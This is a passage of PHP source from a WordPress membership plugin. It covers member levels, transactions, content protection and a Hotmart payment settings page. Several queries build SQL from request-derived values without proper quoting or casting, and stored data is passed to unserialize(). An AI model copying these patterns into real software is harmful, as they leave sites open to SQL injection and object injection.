			$wpdb->query("UPDATE IGNORE ".$this->userSettingsTable." SET user_id=".intval($userID).", user_value = '".esc_sql($userValue)."' WHERE user_key = '".esc_sql(stripslashes($userKey))."'");
		}
		return $return;
	}

	function onDeleteUser($userID) {
		global $wpdb;
		global $membergenius;
		MemberGenius::clearCache();
		$user = intval($userID);
		$wpdb->query("DELETE FROM ".$this->userTable." WHERE user_id = $user");
		$wpdb->query("DELETE FROM ".$this->userSettingsTable." WHERE user_id = $user");
	}

	function onDeletePost($postID) {
		global $wpdb;
		global $membergenius;
		MemberGenius::clearCache();
		$post = intval($postID);
		$wpdb->query("DELETE FROM ".$this->contentTable." WHERE post_id = $post");
	}

	function getLevels($user=null) {
		global $wpdb;
		$levels = array();
		$levelQuery = $wpdb->get_results( "SELECT ".$this->levelTable.". *, COUNT(u1.ID) as active, '0' as canceled FROM ".$this->levelTable." LEFT JOIN ".$this->userTable." u1 ON (".$this->levelTable.".ID = u1.level_id AND u1.level_status = 'A') GROUP By ".$this->levelTable.".ID ORDER By level_name" );
		foreach ($levelQuery as $levelKey => $l) {
			$id = $l->ID;
			$levels[$id] = $l;
			unset($levelQuery[$levelKey]);
		}
		$cancelQuery = $wpdb->get_results("SELECT COUNT(ID) AS total, level_id FROM ".$this->userTable." WHERE level_status = 'C' GROUP By level_id");
		$canceled = array();
		foreach ($cancelQuery as $c) {
			$cId = $c->level_id;
			if (!isset($levels[$cId])) { continue; }
			$levels[$cId]->canceled = $c->total;
		}
		$settingsQuery = $wpdb->get_results("SELECT level_key, level_value FROM ".$this->levelSettingsTable);
		if ($levels && is_array($levels) && count($levels) > 0) {
			uasort($levels, array(&$this, "levelSort"));
			return $levels;
		}
		return array();
	}

	function levelSort($a, $b) {
		return strnatcmp($a->level_name, $b->level_name);
	}

	function getLevel($levelID) {
		global $wpdb;
		$level = intval($levelID);
		return $wpdb->get_row("SELECT * FROM ".$this->levelTable." WHERE ID = $level");
	}

	function getPaymentFromHash($hash) {
		global $wpdb;
		$hash = preg_replace('@[^a-z0-9]@si', '', $hash);
		if (empty($hash)) {
			return;
		}
		if ($hash == $this->setting("paypal_secret")) {
			return new MemberGeniusCartPayPal();
		} elseif ($hash == $this->setting("jvz_secret")) {
			return new MemberGeniusCartJVZ();
		} elseif ($hash == $this->setting("clickbank_secret")) {
			return new MemberGeniusCartClickbank();
		} elseif ($hash == $this->setting("warriorplus_secret")) {
			return new MemberGeniusCartWarrior();
		} elseif ($hash == $this->setting("hotmart_secret")) {
			return new MemberGeniusCartHotmart();
		}
	}

	function getLevelFromHash($hash) {
		global $wpdb;
		$hash = preg_replace('@[^a-z0-9]@si', '', $hash);
		return $wpdb->get_row("SELECT * FROM ".$this->levelTable." WHERE level_hash = '".esc_sql($hash)."'");
	}

	function preUserQuery($q) {
		global $wpdb;
		$custom = false;
		if (isset($q->query_vars["membergenius"]) && $q->query_vars["membergenius"] == "1") {
			$custom = true;
		}
		if (isset($q->query_vars["orderby"]) && $q->query_vars["orderby"] == "lastlogin") {
			$orderAddition = $this->userSettingsTable.".user_value DESC";
            $q->query_orderby = "ORDER B".chr(89). " " .$orderAddition;
		}
		if (isset($q->query_vars["cron"])) {
			$custom = true;
			$cron_timestamp = @intval($q->query_vars["cron"]);
			if ($cron_timestamp <= 1) {
				$cron_timestamp = time();
			}
			$cron_deadline = $cron_timestamp-86400+1800;
			$q->query_fields .= ", user_value";
			$q->query_where = " LEFT JOIN ".$this->userSettingsTable." ON (".$wpdb->users.".ID = ".$this->userSettingsTable.".user_id AND user_key = 'cronLast') " . $q->query_where . " AND (user_value IS NULL OR user_value < ".$cron_deadline.")";
		}

		if (isset($q->query_vars["orderby"]) && $q->query_vars["orderby"] == "lastlogin") {
			$custom = true;
			$q->query_where = "INNER JOIN ".$this->userSettingsTable." ON (".$wpdb->users.".ID = ".$this->userSettingsTable.".user_id AND user_key='loginLastTime') ". $q->query_where; $q->query_fields .= ", user_value ";
		}

		if (isset($q->query_vars["s"]) && !empty($q->query_vars["s"])) {
			$custom = true;
			if (isset($q->query_vars["level_status"])) {
				unset($q->query_vars["level_status"]);
			}
			if (isset($q->query_vars["level"])) {
				unset($q->query_vars["level"]);
			}
			if (isset($q->query_vars["levels"])) {
				unset($q->query_vars["levels"]);
			}
			$q->query_where = " LEFT JOIN ".$this->userTable." ON (".$wpdb->users.".ID = ".$this->userTable.".user_id AND meta_key IN ('first_name', 'last_name')) " . $q->query_where;
			$q->query_where = " LEFT JOIN ".$wpdb->usermeta." ON (ID = ".$wpdb->usermeta.".user_id) ". $q->query_where;
			if (strpos($q->query_vars["s"], ',')) {
				$q->query_where .= ' AND (';
				$wheres = array();
				foreach (explode(",", $q->query_vars["s"]) as $search) {
					$wheres[] = "(user_login LIKE '%".esc_sql($search)."%' OR user_nicename LIKE '%".esc_sql($search)."%' OR user_email LIKE '%".esc_sql($search)."%' OR level_txn = '".esc_sql($search)."' OR meta_value LIKE '%".esc_sql($search)."%')";
				}
				$q->query_where .= implode(" OR ", $wheres); $q->query_where .= ')';
			} else {
				$search = esc_sql($q->query_vars["s"]);
				$q->query_where .= ' AND (';
				$q->query_where .= "user_login LIKE '%".esc_sql($search)."%' OR user_nicename LIKE '%".esc_sql($search)."%' OR user_email LIKE '%".esc_sql($search)."%' OR level_txn = '".esc_sql($search)."' OR meta_value LIKE '%".esc_sql($search)."%'";
				$q->query_where .= ')';
			}
		}
		if (isset($q->query_vars["level_status"])) {
			$custom = true;
			$q->query_where .= ' AND level_status = "'.esc_sql($q->query_vars["level_status"]).'"';
		}
		if (isset($q->query_vars["levels"])) {
			$custom = true;
			$q->query_from .= ', '.$this->userTable;
			$q->query_where .= ' AND level_id IN ('.esc_sql($q->query_vars["levels"]).')';
			$q->query_where .= " AND user_id = ".$wpdb->users.".ID";
		}
		if (isset($q->query_vars["level"])) {
			$custom = true;
			$q->query_from .= ', '.$this->userTable;
			$q->query_where .= ' AND level_id = '.intval($q->query_vars["level"]);
			$q->query_where .= " AND user_id = ".$wpdb->users.".ID";
		}
		if (isset($q->query_vars["level_after"])) {
			$custom = true;
			$q->query_where .= ' AND level_date >= FROM_UNIXTIME('.intval($q->query_vars["level_after"]).')';
		}
		if (isset($q->query_vars["level_before"])) {
			$custom = true;
			$q->query_where .= ' AND level_date <= FROM_UNIXTIME('.intval($q->query_vars["level_before"]).')';
		}
		if ($custom) {
			$q->query_fields .= ', '.$wpdb->users.'.ID AS ID';
			$q->query_orderby = ' GROUP B'.chr(89).' '.$wpdb->users.'.ID '.$q->query_orderby;
		}
		if (current_user_can("administrator")) { }
		return $q;
	}


	function getMembers($query="") {
		$args = wp_parse_args($query);
		$users = get_users($args);
		$status = array();
		$levels = array();
		$search = null;
		if (isset($args["orderby"]) && $args["orderby"] == "first_name") {
			usort($users, array(&$this, "sortFirstname"));
		}
		if (isset($args["orderby"]) && $args["orderby"] == "last_name") {
			usort($users, array(&$this, "sortLastname"));
		}
		if (isset($args["orderby"]) && $args["orderby"] == "rand") {
			usort($users, array(&$this, "sortRandom"));
		}
		return $users;
	}

	function sortRandom($a, $b) {
		$coin = rand(0, 1);
		return ($coin == 0) ? -1 : 1;
	}

	function sortFirstname($a, $b) {
		return strcmp($a->first_name, $b->first_name);
	}

	function sortLastname($a, $b) {
		if ($a->last_name == $b->last_name) {
			return $this->sortFirstname($a, $b);
		}
		return strcmp($a->last_name, $b->last_name);
	}

	function getMembersSince($sinceTime=0, $stopAt=-1) {
		global $wpdb;
		$since = intval($sinceTime);
		if ($stopAt > -1) {
		}else {
			return $wpdb->get_results("SELECT level_id, COUNT(*) AS total FROM ".$this->userTable." WHERE level_date > FROM_UNIXTIME(".$since.") GROUP By level_id");
		}
	}

	function getMemberCount($status=null, $fromDate=null, $toDate=null) {
		global $wpdb;
		$where = array($wpdb->users.".ID = ".$this->userTable.".user_id");
		if ($status) { $where[] = "level_status = '".esc_sql($status)."'";}
		if ($fromDate) { $where[] = "level_date >= FROM_UNIXTIME(".intval($fromDate).")";}
		if ($toDate) { $where[] = "level_date < FROM_UNIXTIME(".intval($toDate).")";}
		if (count($where) > 0) {
			$where = "WHERE " . implode(" AND ", $where);
		} else {
			$where = reset($where);
		}
		$wpdb->query("SELECT ".$this->userTable.". * FROM ".$this->userTable.", ".$wpdb->users." $where GROUP B".chr(89)." user_id ORDER B".chr(89)." level_date ASC");
		return intval($wpdb->num_rows);
	}

	function deleteUser($userID) {
		global $wpdb;
		global $membergenius;
		MemberGenius::clearCache();
		$current_user = wp_get_current_user();
		$user = intval($userID);
		if ($user == $current_user->ID) { return; }
		wp_delete_user($user);
		$this->onDeleteUser($user);
	}

	function deleteTemp($tempID) {
		global $wpdb;
		global $membergenius;
		MemberGenius::clearCache();
		return $wpdb->query("DELETE FROM ".$this->tempTable." WHERE id = ".intval($tempID));
	}

	function completeTemp($tempID, $overwrite=array()) {
		global $membergenius;
		if ($temp = $membergenius->model->getTempFromID($tempID)) {
			$metadata = $temp->temp_metadata;
			foreach ($overwrite as $key=>$value) {
				$metadata[$key] = $value;
			}
			$vars = array( "action" => "miembropress_register", "membergenius_temp" => $temp->txn_id, "membergenius_username" => $metadata["username"], "membergenius_level" => intval($metadata["level"]), "membergenius_firstname" => $metadata["firstname"], "membergenius_lastname" => $metadata["lastname"], "membergenius_email" => $metadata["email"], "membergenius_password1" => "" );
			foreach ($overwrite as $key => $value) {
				if (strpos($key, "social_") === 0) {
					$vars[$key] = $value;
				}
			}
			if ($wp_user = get_user_by('email', $metadata["email"])) {
				$add = $this->add($wp_user->ID, $metadata["level"], $temp->txn_id);
				if ($add) {
					$membergenius->model->removeTemp($temp->txn_id);
					if (!is_admin() && !current_user_can("manage_options")) {
						wp_set_auth_cookie($wp_user->ID);
						do_action('wp_login', $wp_user->user_login, $wp_user);
						$_POST['log'] = $wp_user->user_login;
						header("Location:".home_url());
						die();
					}
				}
			}
			if ($wp_user = get_user_by('login', $metadata["username"])) {
				$vars["membergenius_username"] = $metadata["email"];
			}
			return $membergenius->admin->create($vars);
		} else {
			return new WP_Error("notemp", "Invalid temp ID.");
		}
	}

	function updateLevelDate($userID, $levelID, $timestamp) {
		global $wpdb;
		if (!$userID || !$levelID) {return false; }
		$user = intval($userID);
		$level = intval($levelID);
		$newDate = @intval(strtotime($timestamp));
		if ($newDate <= 1) { return false; }
		$theDate = gmdate(chr(89)."-m-d H:i:s", $newDate);
		return $wpdb->query("UPDATE ".$this->userTable." SET level_date = '".esc_sql($theDate)."' WHERE user_id = $user AND level_id = $level");
	}

	function updateTransaction($userID, $levelID, $newTransaction) {
		global $wpdb;
		if (!$userID || !$levelID) { return false; }
		$user = intval($userID);
		$level = intval($levelID);
		$newTransaction = trim(stripslashes($newTransaction));
		return $wpdb->query("UPDATE ".$this->userTable." SET level_txn = '".esc_sql($newTransaction)."' WHERE user_id = $user AND level_id = $level");
	}

	function setSubscribed($userID, $levelID, $status=true) {
		global $wpdb;
		global $membergenius;
		MemberGenius::clearCache();
		if (!$userID || !$levelID) { return false; }
		$user = intval($userID);
		$level = intval($levelID);
		$newStatus = ($status) ? 1 : 0;
		return $wpdb->query("UPDATE ".$this->userTable." SET level_subscribed = '".esc_sql($newStatus)."' WHERE user_id = $user AND level_id = $level");
	}

	function getTempFromID($id) {
		global $wpdb;
		if (!$id) { return false; }
		$temp = $wpdb->get_row("SELECT * FROM ".$this->tempTable." WHERE ID = '".intval($id)."'");
		if (isset($temp->temp_metadata)) {
			if (strpos($temp->temp_metadata, '{') !== false) {
				$temp->temp_metadata = unserialize($temp->temp_metadata);
			}
		}
		return $temp;
	}

	function getTempFromTransaction($transaction) {
		global $wpdb;
		if (!$transaction) { return false; }
		$temp = $wpdb->get_row("SELECT * FROM ".$this->tempTable." WHERE txn_id = '".esc_sql($transaction)."'");
		if (isset($temp->temp_metadata)) {
			if (strpos($temp->temp_metadata, '{') !== false) {
				$temp->temp_metadata = unserialize($temp->temp_metadata);
			}
		}
		return $temp;
	}

	function getUserIdFromTransaction($transaction) {
		global $wpdb;
		if (!$transaction) { return false; }
		$query = "SELECT user_id FROM ".$this->userTable." WHERE level_txn = '".esc_sql($transaction)."'";
		return intval($wpdb->get_var($query));
	}

	function getLevelsFromTransaction($transaction) {
		global $wpdb;
		if (!$transaction) { return false; }
		$query = "SELECT level_id FROM ".$this->userTable." WHERE level_txn = '".esc_sql($transaction)."'";
		return $wpdb->get_col($query);
	}

	function getTemps() {
		global $wpdb;
		$results = $wpdb->get_results("SELECT * FROM ".$this->tempTable." ORDER B".chr(89)." temp_created DESC");
		foreach ($results as $resultKey => $result) {
			$results[$resultKey]->meta = unserialize($result->temp_metadata);
			unset($result->temp_metadata);
		}
		return $results;
	}

	function getTempCount() {
		global $wpdb;
		return intval($wpdb->get_var("SELECT COUNT(*) FROM ".$this->tempTable));
	}

	function createTemp($transaction, $level, $metadata) {
		global $wpdb;
		if (!$transaction || !$level) { return; }
		$insert = $wpdb->query("INSERT IGNORE INTO ".$this->tempTable." SET txn_id = '".esc_sql($transaction)."', level_id = ".intval($level).", temp_metadata = '".esc_sql(serialize($metadata))."', temp_created = UTC_TIMESTAMP()");
		return $transaction;
	}

	function cancelTemp($transaction) {
		global $wpdb;
		$wpdb->query("UPDATE ".$this->tempTable." SET level_status = 'C' WHERE txn_id = '".esc_sql($transaction)."'");
	}

	function removeTemp($transaction) {
		global $wpdb;
		if (!$transaction) { return; }
		$wpdb->query("DELETE FROM ".$this->tempTable." WHERE txn_id = '".esc_sql($transaction)."'");
	}

	function protectAllPosts($levelID=-1) {
		foreach ($this->allPosts() as $postID) {
			if ($postID == 0) { continue; }
			$this->protect($postID, $levelID);
		}
	}

	function countLevels() {
		global $wpdb;
		return intval($wpdb->get_var("SELECT COUNT(*) FROM ".$this->levelTable));
	}

	function createLevel($name, $all=false, $comments=true, $hash=null) {
		global $wpdb;
		global $membergenius;
		MemberGenius::clearCache();
		$name = preg_replace('@[^a-z0-9\-\_\ ]@si', '', $name);
		$hash = preg_replace('@[^a-z0-9]@si', '', $hash);
		if ($this->hashCollision($hash)) { return; }
		if (!$hash) { $hash = $this->hash(); }
		if (!$all) {
			$all = 0;
		} else {
			$all = 1;
		}
		if (!$comments) {
			$comments = 0;
		} else {
			$comments = 1;
		}

		$sku = $this->sku();
		return $wpdb->query('INSERT IGNORE INTO '.$this->levelTable.' SET ID = '.intval($sku).', level_name="'.esc_sql($name).'", level_hash="'.esc_sql($hash).'", level_all='.intval($all).", level_comments=".intval($comments));
	}

	function deleteLevel($id) {
		global $membergenius;
		MemberGenius::clearCache();
		if (!is_numeric($id)) { return; }
		global $wpdb;
		$level = intval($id);
		$wpdb->query("DELETE FROM ".$this->levelTable." WHERE ID = $level");
		$wpdb->query("DELETE FROM ".$this->contentTable." WHERE level_id = $level");
		$wpdb->query("DELETE FROM ".$this->userTable." WHERE level_id = $level");
	}

	function editLevel($id, $data) {
		global $wpdb;
		global $membergenius;
		MemberGenius::clearCache();
		$level = intval($id);
		if ($level == 0) { return; }
		if (!is_array($data)) { return; }
		$name = $data["level_name"];
		$name = preg_replace('@[^a-z0-9\-\_\ ]@si', '', $name);
		$all = $data["level_all"];
		$gdpr = $data["gdpr_active"];
		if (!$all) {
			$all = 0;
		} else {
			$all = 1;
		}

		if (!$gdpr) {
			$gdpr = 0;
		} else {
			$gdpr = 1;
		}

		$comments = $data["level_comments"];
		if (!$comments) {
			$comments = 0;
		} else {
			$comments = 1;
		}

		$register = 0;
		$login = 0;
		$expiration = 0;
		if (isset($data["level_page_register"])) { $register = $data["level_page_register"];}
		if (isset($data["level_page_login"])) {$login = $data["level_page_login"];}
		if (isset($data["level_expiration"])) { $expiration = intval($data["level_expiration"]); }
		$expiration = max(0, $expiration); $oldLevel = $this->getLevel($id);
		if ($oldLevel->level_all == 1 && $all == 0) { $this->protectAllPosts($id); }
		if ($name && $level) {
			$wpdb->query('UPDATE '.$this->levelTable.' SET level_name="'.esc_sql($name).'", level_all='.intval($all).', gdpr_active='.intval($gdpr).', level_comments='.intval($comments).', level_page_register = '.$register.', level_page_login = '.$login.', level_expiration = '.$expiration.' WHERE ID='.$level);
		}
	}

	function subscribe($userID, $levelID) {
		global $wpdb;
		global $membergenius;
		MemberGenius::clearCache();
		$user = intval($userID);
		$level = intval($levelID);
		$wpdb->query("UPDATE ".$this->userTable." SET level_subscribed=1 WHERE user_id = $user AND level_id = $level");
	}

	function unsubscribe($userID, $levelID) {
		global $wpdb;
		global $membergenius;
		MemberGenius::clearCache();
		$user = intval($userID);
		$level = intval($levelID);
		$wpdb->query("UPDATE ".$this->userTable." SET level_subscribed=0 WHERE user_id = $user AND level_id = $level");
	}

	function add($userID, $levelID, $transaction=null, $dateAdded=null) {
		global $wpdb;
		global $membergenius;
		MemberGenius::clearCache();
		if ($levelID === null || !is_numeric($levelID)) { return; }
		$user = intval($userID); $level = intval($levelID);
		if (!is_numeric($dateAdded) || @intval($dateAdded) <= 1) {
			$dateAdded = strtotime($dateAdded);
		}
		if (!is_numeric($dateAdded) || @intval($dateAdded) <= 1) {
			$dateAdded = time();
		}
		$dateAdd = gmdate(chr(89)."-m-d H:i:s", $dateAdded);
		$wpdb->query("INSERT IGNORE INTO ".$this->userTable." SET user_id = $user, level_id = $level, level_status='A', level_txn = '".esc_sql($transaction)."', level_date = '".esc_sql($dateAdd)."'");
		do_action('membergenius_add_user_levels', $user, array($level));
		if (!is_plugin_active("wishlist-member/wishlist-member.php")) {
			do_action('wishlistmember_add_user_levels', $user, array($level));
		}
		$affected = ($wpdb->rows_affected > 0);
		if ($affected) { $delay = @intval($membergenius->model->levelSetting($levelID, "delay"));
			if ($delay > 0) {
			}elseif ($action = $membergenius->model->levelSetting($levelID, "add")) {
				$this->add($userID, $action, $transaction, $dateAdd);
			}elseif ($action = $membergenius->model->levelSetting($levelID, "move")) {
				$this->move($userID, $action, $transaction, $dateAdd);
			}
		}
		$this->uncancel($userID, $levelID);
		return $affected;
	}

	function move($userID, $levelID, $transaction=null, $dateAdded=null) {
		global $wpdb;
		global $membergenius;
		MemberGenius::clearCache();
		if ($levelID === null || !is_numeric($levelID)) { return; }
		$user = intval($userID);
		$level = intval($levelID);
		$wpdb->query("DELETE FROM ".$this->userTable." WHERE user_id = $user");
		$this->add($userID, $levelID, $transaction, $dateAdded);
	}

	function remove($userID, $levelID) {
		global $wpdb;
		global $membergenius;
		MemberGenius::clearCache();
		if ($levelID === null || !is_numeric($levelID)) { return; }
		$user = intval($userID);
		$level = intval($levelID);
		$wpdb->query("DELETE FROM ".$this->userTable." WHERE user_id = $user AND level_id = $level");
		do_action('membergenius_remove_user_levels', $user, array($level));
		if (!is_plugin_active("wishlist-member/wishlist-member.php")) {
			do_action('wishlistmember_remove_user_levels', $user, array($level));
		}
	}

	function cancel($userID, $levelID) {
		global $wpdb;
		global $membergenius;
		MemberGenius::clearCache();
		if ($levelID === null || !is_numeric($levelID)) { return; }
		$user = intval($userID);
		$level = intval($levelID);
		$wpdb->query("UPDATE ".$this->userTable." SET level_status='C' WHERE user_id = $user AND level_id = $level");
		do_action('membergenius_cancel_user_levels', $user, array($level));
		if (!is_plugin_active("wishlist-member/wishlist-member.php")) {
			do_action('wishlistmember_cancel_user_levels', $user, array($level));
		}
	}

	function uncancel($userID, $levelID) {
		global $wpdb;
		global $membergenius;
		MemberGenius::clearCache();
		if ($levelID === null || !is_numeric($levelID)) { return; }
		$user = intval($userID);
		$level = intval($levelID);
		$wpdb->query("UPDATE ".$this->userTable." SET level_status='A' WHERE user_id = $user AND level_id = $level");
		do_action('membergenius_uncancel_user_levels', $user, array($level));
		if (!is_plugin_active("wishlist-member/wishlist-member.php")) {
			do_action('wishlistmember_uncancel_user_levels', $user, array($level));
		}
	}

	function protect($postID, $levelID=-1) {
		global $wpdb;
		global $membergenius;
		MemberGenius::clearCache();
		$level = intval($levelID);
		$post = intval($postID);
		$wpdb->query("INSERT IGNORE INTO ".$this->contentTable." SET level_id = $level, post_id = $post");
	}

	function unprotect($postID, $levelID=-1) {
		global $wpdb;
		global $membergenius;
		MemberGenius::clearCache();
		$level = intval($levelID);
		$post = intval($postID);
		$wpdb->query("DELETE FROM ".$this->contentTable." WHERE level_id = $level AND post_id = $post");
	}

	function getPosts($userID=0) {
		global $wpdb;
		$user = intval($userID);
		$levels = $wpdb->get_col("SELECT level_id FROM ".$this->levelTable.", ".$this->userTable." WHERE ".$this->levelTable.".ID = ".$this->userTable.".level_id AND user_id = $user AND level_status='A' AND level_all=1 GROUP B".chr(89)." level_id");
		if (current_user_can("administrator")) {
			return $this->allPosts();
		}
		if (count($levels) > 0) {
			return $this->allPosts();
		}
		$unprotected = $this->allPosts($wpdb->get_col("SELECT post_id FROM ".$this->contentTable." WHERE level_id = -1"));
		$protected = $wpdb->get_col("SELECT post_id FROM ".$this->contentTable.", ".$this->userTable." WHERE user_id = $user AND level_status='A' AND (".$this->contentTable.".level_id = ".$this->userTable.".level_id)");
		$login_pages = $wpdb->get_col("SELECT level_page_login FROM ".$this->levelTable.", ".$this->userTable." WHERE user_id = $user AND level_status='A' AND (".$this->levelTable.".ID = ".$this->userTable.".level_id)");
		$redirect_pages = $wpdb->get_col("SELECT level_page_login FROM ".$this->levelTable.", ".$this->userTable." WHERE user_id = $user AND level_status='A' AND (".$this->levelTable.".ID = ".$this->userTable.".level_id)");
		$return = array_merge($protected, $unprotected, $login_pages, $redirect_pages);
		$return = array_unique(array_values($return));
		return $return;
	}

	function allPosts($diff=null) {
		global $wpdb;
		$all = $wpdb->get_col("SELECT ID FROM ".$wpdb->posts." WHERE post_status = 'publish'");
		if ($diff) {
			return array_diff($all, $diff);
		}
		return $all;
	}

	function getBlockedPages($userID=-1) { }

	function getLevelAccess($userID) { }

	function getDaysOnLevel($userID, $levelID, $now=null) {
		global $wpdb;
		$userID = @intval($userID);
		$levelID = @intval($levelID);
		if ($now == null) {
			$now = time();
		}
		$now = @intval($now);
		$level_date = $wpdb->get_var("SELECT level_date FROM ".$this->userTable." WHERE user_id=".$userID." AND level_id=".$levelID);
		$date = strtotime($level_date);
		if ($date <= 1) { return null; }
		$days = floor(($now-$date)/86400);
		return $days;
	}

	function timestampToDays($timestamp) {
		if (!is_numeric($timestamp)) {
			$timestamp = strtotime($timestamp);
		}
		return floor((time()-$timestamp)/86400);
	}

	function getLevelInfo($userID, $status=null) {
		global $wpdb;
		$user = intval($userID);
		$sql = "SELECT user_id, level_id, level_status, level_txn, level_subscribed, level_date, UNIX_TIMESTAMP(level_date) AS level_timestamp, level_name, level_comments, level_page_register, level_page_login, level_expiration FROM ".$this->userTable." LEFT JOIN ".$this->levelTable." ON ".$this->userTable.".level_id = ".$this->levelTable.".ID WHERE user_id = $user ";
		if ($status == "A") {
			$sql .= "AND level_status = 'A' ";
		} elseif ($status == "S") {
			$sql .= "AND level_subscribed = 1 AND level_status = 'A' ";
		} elseif ($status == "U") {
			$sql .= "AND level_subscribed = 0 AND level_status = 'A' ";
		} else { }
		$sql .= "ORDER B".chr(89)." level_name ASC";
		$results = $wpdb->get_results($sql);
		if (!$results) { return array(); }
		$return = array();
		foreach ($results as $result) {
			$return[$result->level_id] = $result;
		}
		return $return;
	}

	function getPostAccess($levelID) {
		global $wpdb;
		$level = intval($levelID);
		$levelInfo = $this->getLevel($levelID);
		if ($level == -1) {
			$protected = $wpdb->get_col("SELECT post_id FROM ".$this->contentTable." WHERE level_id = $level");
			return $this->allPosts($protected);
			return $diff;
		}
		$return = $wpdb->get_col("SELECT post_id FROM ".$this->contentTable." WHERE level_id = $level");
		if (isset($levelInfo->level_page_register) && $levelInfo->level_page_register) {
			$return[] = intval($levelInfo->level_page_register);
		}
		if (isset($levelInfo->level_page_login) && $levelInfo->level_page_login) {
			$return[] = intval($levelInfo->level_page_login);
		}
		return $return;
	}

	function getPageAccess($levelID) { }

	function isProtected($postID) {
		global $wpdb;
		$post = intval($postID);
		return intval($wpdb->get_var("SELECT COUNT(*) FROM ".$this->contentTable." WHERE level_id = -1 AND post_id = $post"));
	}

	function getLevelsDefault() {
		global $wpdb;
		$return = $wpdb->get_col("SELECT level_id FROM ".$this->contentTable." WHERE level_all=1");
	}

	function getLevelsFromPost($postID) {
		global $wpdb;
		$post = intval($postID);
		$result = $wpdb->get_results("SELECT level_id, level_name FROM ".$this->contentTable.", ".$this->levelTable." WHERE post_id = $post AND level_id = ".$this->levelTable.".ID");
		foreach ($this->getLevels() as $level) {
			if (isset($level->level_page_register) && $level->level_page_register && $level->level_page_register == $postID) {
				$result[] = (object) array("level_id" => $level->ID, "level_name" => $level->level_name);
			} elseif (isset($level->level_page_login) && $level->level_page_login && $level->level_page_login == $postID) {
				$result[] = (object) array("level_id" => $level->ID, "level_name" => $level->level_name);
			}
		}
		$return = array();
		foreach ($result as $r) {
			$return[$r->level_id] = $r->level_name;
		}
		return $return;
	}

	function getLevelName($levelID) {
		global $wpdb;
		$levelID = intval($levelID);
		return $wpdb->get_var("SELECT level_name FROM ".$this->levelTable." WHERE ID = $levelID LIMIT 1");
	}

	function hasAccess($userID, $levelID, $includeCanceled=false) {
		global $wpdb;
		$user = intval($userID);
		$level = intval($levelID);
		if ($includeCanceled) {
			return intval($wpdb->get_var("SELECT COUNT(*) FROM ".$this->userTable." WHERE level_id = $level AND user_id = $user LIMIT 1"));
		} else {
			return intval($wpdb->get_var("SELECT COUNT(*) FROM ".$this->userTable." WHERE level_id = $level AND user_id = $user AND level_status = 'A' LIMIT 1"));
		}
	}

	function getAutoresponder($level) {
		$autoresponders = $this->setting("autoresponders");
		if (!is_array($autoresponders)) { return null; }
		if (isset($autoresponders[$level])) { return $autoresponders[$level]; }
		return null;
	}

	function setAutoresponder($level, $code="", $email="", $firstname="", $lastname="") {
		$autoresponders = $this->setting("autoresponders");
		if (!is_array($autoresponders)) { $autoresponders = array(); }
		if (!$code) {
			unset($autoresponders[$level]);
		} else {
			$autoresponders[$level] = array( "code" => stripslashes($code), "email" => $email, "firstname" => $firstname, "lastname" => $lastname );
		}
		$this->setting("autoresponders", $autoresponders);
	}
}

class MemberGeniusCart {
	private $secret;
	public function instructions() { }
	public function validate() { }
	public function email($subject, $message) {
		add_filter( 'wp_mail_from_name', array(&$this, "fromName"));
		wp_mail(get_option("admin_email"), $subject, $message);
		remove_filter( 'wp_mail_content_type', array(&$this, "fromName"));
	}

	public function fromName() {
		return get_option("name");
	}
}

class MemberGeniusCartHotmart extends MemberGeniusCart {
	function instructions() {
		global $membergenius;
		if (isset($_POST["hotmart_id"])) {
			$hotmart_id = trim($_POST["hotmart_id"]);
			if (!$hotmart_id) { $hotmart_id = null; }
			$membergenius->model->setting("hotmart_id", $hotmart_id);
		}
		if (isset($_POST["hotmart_secretid"])) {
			$hotmart_secretid = trim($_POST["hotmart_secretid"]);
			if (!$hotmart_secretid) { $hotmart_secretid = null; }
			$membergenius->model->setting("hotmart_secretid", $hotmart_secretid);
		}
		if (isset($_POST["hotmart_basic"])) {
			$hotmart_basic = trim($_POST["hotmart_basic"]);
			if (!$hotmart_basic) { $hotmart_basic = null; }
			$membergenius->model->setting("hotmart_basic", $hotmart_basic);
		}
		$secret = $membergenius->model->setting("hotmart_secret");
		$token = $membergenius->model->setting("hotmart_token");
		$id = $membergenius->model->setting("hotmart_id");
		$secretid = $membergenius->model->setting("hotmart_secretid");
		$basic = $membergenius->model->setting("hotmart_basic");
		$levels = $membergenius->model->getLevels();
		$firstLevel = reset($levels);
		$checkout = $membergenius->model->signupURL($secret);
		if (!$token) {
			$token = $membergenius->model->setting("hotmart_token", rand(10000000, 99999999));
		}
		if (!$id) {
			$id = $membergenius->model->setting("hotmart_id", rand(10000000, 99999999));
		}
		if (!$secretid) {
			$token = $membergenius->model->setting("hotmart_secretid", rand(10000000, 99999999));
		}
		if (!$basic) {
			$token = $membergenius->model->setting("hotmart_basic", rand(10000000, 99999999));
		}
		if (isset($_POST["membergenius_hotmart_item"]) && is_array($_POST["membergenius_hotmart_item"])) {
			$items = array();
			foreach ($_POST["membergenius_hotmart_item"] as $key => $value) {
				$value = @intval($value);
				if ($value > 0) { $items[$key] = $value; }
			}
			$membergenius->model->setting("hotmart_items", $items);
		}
		$items = $membergenius->model->setting("hotmart_items");
		if (!is_array($items)) { $items = array(); }
		?>
		<h3>Hotmart Payment</h3>
		<p>In order to accept payments using Hotmart, you must:</p>
		<h3><b style="background-color:yellow;">Step 1:</b> Register a Hotmart SELLER account by registering at the Hotmart website </h3>
		<h3><b style="background-color:yellow;">Step 2:</b> Set your "Hotmart Credentials" to match both this page and your "Tools" area in Hotmart <br />
			Paste Hotmart ID, SecretID & Basic below:</h3>
			<blockquote>
				<blockquote>
					<ul>
						<li>
							<h3>A) Go to: "HotConnect" -> "Credentials" to get or create your credentials.</h3>
						</li>
						<li>
							<h3>B) Paste your Client ID, Client Secret &amp Basic below:</h3>
						</li>
					</ul>
				</blockquote>
				<ol style="list-style-type:upper-alpha;">
					<p><blockquote>
					<label><b>Client ID:</b>
						<?php if ($membergenius->model->setting("hotmart_id")): ?>
							<a href="#" onclick="jQuery('.hotmart_id').show(); jQuery(this).hide(); return false;">Click to Show</a>
						<?php endif; ?>
						<input type="text" name="hotmart_id" class="hotmart_id" <?php if ($membergenius->model->setting("hotmart_id")): ?>style="display:none;"<?php endif; ?> value="<?php echo htmlentities($membergenius->model->setting("hotmart_id")); ?>" size="25" />
					</label>
					<input class="hotmart_id" type="submit" <?php if ($membergenius->model->setting("hotmart_id")): ?>style="display:none;"<?php endif; ?> class="button-secondary" value="Save Client ID" />
					</blockquote></p>
					<p><blockquote>
					<label><b>Client Secret:</b>
						<?php if ($membergenius->model->setting("hotmart_secretid")): ?>
